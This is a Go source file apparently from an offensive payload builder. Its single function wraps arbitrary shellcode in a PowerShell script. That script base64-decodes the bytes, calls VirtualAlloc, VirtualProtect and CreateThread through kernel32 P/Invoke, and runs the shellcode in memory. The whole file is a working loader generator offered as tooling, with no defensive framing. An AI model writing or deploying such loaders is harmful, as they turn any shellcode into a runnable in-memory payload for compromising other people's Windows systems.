package main

import (
	"encoding/base64"
	"strings"
)

// buildPowerShellScript wraps raw shellcode bytes into a self-contained .ps1
// script that allocates RWX memory via P/Invoke and runs the shellcode in a
// new thread.  The base64 payload is split into 10 000-char chunks so the
// script stays readable and avoids any potential line-length issues.
func buildPowerShellScript(shellcode []byte) []byte {
	b64 := base64.StdEncoding.EncodeToString(shellcode)
	const chunkSize = 10000
	var sb strings.Builder

	for i := 0; i < len(b64); i += chunkSize {
		end := i + chunkSize
		if end > len(b64) {
			end = len(b64)
		}
		if i == 0 {
			sb.WriteString("$b64='")
			sb.WriteString(b64[i:end])
			sb.WriteString("'\n")
		} else {
			sb.WriteString("$b64+='")
			sb.WriteString(b64[i:end])
			sb.WriteString("'\n")
		}
	}

	sb.WriteString("$sc=[Convert]::FromBase64String($b64)\n")
	sb.WriteString("$sz=$sc.Length\n")
	sb.WriteString("$m=''\n")
	sb.WriteString("$m+='[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);'\n")
	sb.WriteString("$m+='[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, UIntPtr s, IntPtr e, IntPtr p, uint f, IntPtr i);'\n")
	sb.WriteString("$m+='[DllImport(\"kernel32.dll\")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);'\n")
	sb.WriteString("$m+='[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);'\n")
	sb.WriteString("$k32=Add-Type -MemberDefinition $m -Name K32 -Namespace '' -PassThru\n")
	sb.WriteString("$buf=$k32::VirtualAlloc(0,[UIntPtr][uint32]$sz,0x3000,0x04)\n")
	sb.WriteString("[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$buf,$sz)\n")
	sb.WriteString("$old=[uint32]0\n")
	sb.WriteString("[void]($k32::VirtualProtect($buf,[UIntPtr][uint32]$sz,0x20,[ref]$old))\n")
	sb.WriteString("$h=$k32::CreateThread(0,[UIntPtr]::new(0),$buf,0,0,0)\n")
	sb.WriteString("[void]($k32::WaitForSingleObject($h,[uint32]::MaxValue))\n")

	return []byte(sb.String())
}
